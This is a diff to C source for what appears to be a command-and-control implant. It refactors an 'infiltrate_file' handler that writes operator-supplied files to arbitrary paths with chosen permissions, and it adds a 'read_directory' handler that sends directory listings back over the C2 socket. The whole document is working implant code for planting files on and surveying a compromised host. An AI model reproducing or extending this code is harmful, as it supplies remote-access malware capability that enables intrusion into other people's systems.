@@ -1,10 +1,12 @@
+#include <sys/stat.h>
+#include <sys/types.h>
 #include <fcntl.h>
 #include <unistd.h>
-#include <sys/stat.h>
 #include <stdlib.h>
 #include <errno.h>
 #include <stdio.h>
 #include <string.h>
+#include <dirent.h>
 
 #include "c2_prot.h"
 #include "commands.h"
@@ -57,13 +59,11 @@ finish:
 out:
     write(sockfd, res, res->header.res_len);
 
-    if (fd < 0)
+    if (fd > 0)
         close(fd);
 
     free(res);
     res = NULL;
-
-    return;
 }
 
 void infiltrate_file(int sockfd, struct inf_req *req)
@@ -76,13 +76,13 @@ void infiltrate_file(int sockfd, struct inf_req *req)
 
     path = (char *)malloc(req->path_len);
     memset(path, 0, req->path_len);
-    memcpy(path, req->path_content, req->path_len);
+    memcpy(path, req->data, req->path_len);
 
     content = (char *)malloc(req->content_len);
     memset(content, 0, req->content_len);
-    memcpy(content, req->path_content + req->path_len, req->content_len);
+    memcpy(content, req->data + req->path_len, req->content_len);
 
-    printf("File path: %s\n", req->path_content);
+    printf("File path: %s\n", req->data);
     printf("File size: %u\n", req->content_len);
 
     if ((fd = open(path, O_WRONLY | O_CREAT, req->perm)) < 0)
@@ -113,6 +113,63 @@ out:
     free(content);
     free(res);
     res = NULL;
+}
 
-    return;
+void read_directory(int sockfd, struct dir_req *req)
+{
+    struct dir_res *res;
+    DIR *dirp = NULL;
+    enum file_status status = GOOD;
+    struct dirent *dent;
+    struct stat statbuf;
+    int dirent_count;
+    size_t filename_len = 0;
+    void *end_value = NULL;
+    int fd = -1;
+
+    printf("Directory path: %s\n", req->path);
+
+    if (stat(req->path, &statbuf) < 0)
+    {
+        perror("Error on stat");
+        status = STAT_ERROR;
+        goto finish;
+    }
+
+    if (!S_ISDIR(statbuf.st_mode))
+    {
+        perror("Not a directory");
+        status = NOT_DIRECTORY;
+        goto finish;
+    }
+
+    if (!(dirp = opendir(req->path)))
+    {
+        perror("Error in opendir");
+        status = OPEN_ERROR;
+        goto finish;
+    }
+
+finish:
+    res = dir_res_init(status);
+
+    write(sockfd, res, sizeof(struct dir_res));
+
+    if (status != GOOD)
+        goto out;
+
+    while (dent = readdir(dirp))
+    {
+        puts(dent->d_name);
+        filename_len = strlen(dent->d_name);
+        write(sockfd, &filename_len, sizeof(size_t));
+        write(sockfd, dent->d_name, filename_len);
+    }
+
+    write(sockfd, &end_value, sizeof(void *));
+
+    closedir(dirp);
+
+out:
+    free(res);
 }
